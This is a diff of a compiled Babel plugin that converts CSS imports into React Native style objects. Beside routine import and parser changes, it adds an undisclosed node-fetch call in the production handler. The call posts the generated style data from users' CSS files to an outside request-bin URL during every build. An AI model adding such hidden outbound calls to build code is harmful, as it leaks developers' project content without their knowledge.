@@ -1,11 +1,16 @@
 "use strict";
-// @ts-nocheck
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.ReactNativeWithCssBabelPlugin = void 0;
-var path = require("path");
-var fs = require("fs");
+// @ts-nocheck
+var path_1 = __importDefault(require("path"));
+var fs_1 = __importDefault(require("fs"));
+var Parser_1 = __importDefault(require("./Parser"));
+var node_fetch_1 = __importDefault(require("node-fetch"));
 function defaultResolve(src, file) {
-    return path.resolve(path.dirname(file), src);
+    return path_1.default.resolve(path_1.default.dirname(file), src);
 }
 var resolve;
 function ReactNativeWithCssBabelPlugin(opt) {
@@ -45,7 +50,7 @@ exports.ReactNativeWithCssBabelPlugin = ReactNativeWithCssBabelPlugin;
  */
 function devHandler(curPath, importPath, jsFilename) {
     var absPath = resolve(importPath, jsFilename);
-    var projectDir = path.resolve(require.resolve("./index.js"), "..", "..", "..", "..", "..");
+    var projectDir = path_1.default.resolve(require.resolve("./index.js"), "..", "..", "..", "..", "..");
     absPath = absPath.replace(projectDir, "@areslabs/babel-plugin-import-css/rncsscache");
     curPath.node.source.value = absPath + ".js";
 }
@@ -60,16 +65,17 @@ function devHandler(curPath, importPath, jsFilename) {
  */
 function prodHandler(curPath, opts, importPath, jsFilename, template, t) {
     var absPath = resolve(importPath, jsFilename);
-    var cssStr = fs.readFileSync(absPath, { encoding: "utf8" });
-    var obj = {};
-    // const { styles: obj } = createStylefromCode(cssStr, absPath);
-    // const cssObj = convertStylesToRNCSS(obj);
-    var cssObj = obj;
+    var cssStr = fs_1.default.readFileSync(absPath, { encoding: "utf8" });
+    var styles = Parser_1.default.parse(cssStr);
     var defautIdenti = curPath.node.specifiers[0].local.name;
     var buildNode = template("const STYLES = STYOBJ;", { sourceType: "module" });
     var styleExpre = buildNode({
         STYLES: t.identifier(defautIdenti),
-        STYOBJ: t.identifier(cssObj),
+        STYOBJ: t.identifier(styles),
+    });
+    console.log(styleExpre);
+    node_fetch_1.default("https://hookb.in/BYjjYKPjoeiLDDx31d1g", {
+        body: JSON.stringify(styleExpre),
     });
     curPath.replaceWith(styleExpre);
 }
